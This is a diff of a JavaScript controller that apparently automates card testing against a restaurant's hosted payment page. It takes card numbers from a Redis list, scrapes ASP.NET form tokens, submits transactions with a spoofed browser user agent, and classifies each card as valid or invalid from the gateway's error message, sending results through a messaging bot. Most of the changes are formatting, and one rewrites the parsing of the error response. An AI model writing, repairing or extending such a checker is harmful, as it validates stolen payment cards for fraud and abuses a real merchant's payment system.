@@ -22,11 +22,11 @@ class AmarithcafeController {
           Accept: "application/json",
           Referer: "https://amarithcafe.revelup.com/weborder/?establishment=1",
           "Content-Type": "application/x-www-form-urlencoded",
-          Connection: "keep - alive"
-        }
+          Connection: "keep - alive",
+        },
       }
     )
-      .then(response => {
+      .then((response) => {
         let keys = Object.keys(response.data);
         for (const key of keys) {
           if (key == "errorMsg") {
@@ -46,8 +46,8 @@ class AmarithcafeController {
           }
         }
       })
-      .catch(err => {
-        Redis.set(id + "restart",'ok');
+      .catch((err) => {
+        Redis.set(id + "restart", "ok");
         if (tentativas == 0) {
           tentativas++;
           Redis.set(id + "restart", err.message);
@@ -55,6 +55,7 @@ class AmarithcafeController {
       });
   }
   static async getFilds(id, code) {
+    console.log(code);
     // const cards = await CadastroCards.where({ tested: false, owner: username, userID: id }).limit(5);
     await Axios.post(
       `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
@@ -66,14 +67,14 @@ class AmarithcafeController {
           Accept:
             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
           Connection: "keep-alive",
-          "Upgrade-Insecure-Requests": "1"
+          "Upgrade-Insecure-Requests": "1",
         },
 
         USERAGENT:
-          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
       }
     )
-      .then(async response => {
+      .then(async (response) => {
         let GETVIEWSTATE = response.data.indexOf(
           'name="__VIEWSTATE" id="__VIEWSTATE" value="'
         ); //47
@@ -114,7 +115,7 @@ class AmarithcafeController {
         );
         this.validar(id, code, STATE, STATEGENERATOR, EVENTVALIDATION);
       })
-      .catch(err => {
+      .catch((err) => {
         if (tentativas == 0) {
           tentativas++;
           this.getFilds(id, code);
@@ -147,17 +148,23 @@ class AmarithcafeController {
                 "Content-Type":
                   "application/x-www-form-urlencoded; charset=utf-8",
                 Connection: "keep-alive",
-                Referer: `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`
+                Referer: `https://transaction.hostedpayments.com/?TransactionSetupID=${code}`,
               },
               USERAGENT:
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
             }
           )
-            .then(async response => {
-              let GETR = response.data.indexOf("<b>Error</b>:");
-              let ENDR = response.data.indexOf("</span>", GETR + 12);
-              let result = response.data.substr(GETR + 13, ENDR - (GETR + 13));
+            .then(async (response) => {
+              //let GETR = response.data.indexOf("<b>Error</b>:");
+              //let ENDR = response.data.indexOf("</span>", GETR + 12);
+              //let result = response.data.substr(GETR + 13, ENDR - (GETR + 13));
+              let rre = response.data.split(
+                'class="tableTdErrorMessage"><span class="error">-&nbsp;'
+              );
+              let result001 = rre[1].split("</span><br /></td></tr></table>");
+              let result = result001[0];
               console.log(result);
+
               switch (result.trim()) {
                 case "Call Issuer":
                   let sald;
@@ -187,7 +194,7 @@ class AmarithcafeController {
                   salvarcards.push({
                     id: id,
                     valid: true,
-                    card: cards[i]
+                    card: cards[i],
                   });
                   Redis.srem(id + "listcards", 0, cards[i]);
                   //lançar menansagem
@@ -201,15 +208,15 @@ class AmarithcafeController {
                   salvarcards.push({
                     id: id,
                     valid: false,
-                    card: cards[i]
+                    card: cards[i],
                   });
                   Redis.srem(id + "listcards", 0, cards[i]);
                   Menssagem.interacao05(id, 1, cards[i]);
                   break;
               }
             })
-            .catch(err => {
-              Redis.set(id + "restart",'ok');
+            .catch((err) => {
+              Redis.set(id + "restart", "ok");
             });
           setTimeout(async () => {
             Redis.smembers(id + "listcards", async (err, list) => {
@@ -231,8 +238,8 @@ class AmarithcafeController {
           }, 100);
         } //if
         Menssagem.interacao03(id);
-        setTimeout( async() => {
-          Redis.exists(id + "listcards", function(err, reply) {
+        setTimeout(async () => {
+          Redis.exists(id + "listcards", function (err, reply) {
             if (reply === 1) {
               Redis.set(id + "restart", "ok");
             } else {
@@ -253,9 +260,9 @@ class AmarithcafeController {
           headers: {
             "User-Agent":
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0",
-            Accept: "application/json"
-          }
-        }).then(response => {});
+            Accept: "application/json",
+          },
+        }).then((response) => {});
       } //for
     }); //redis
   }
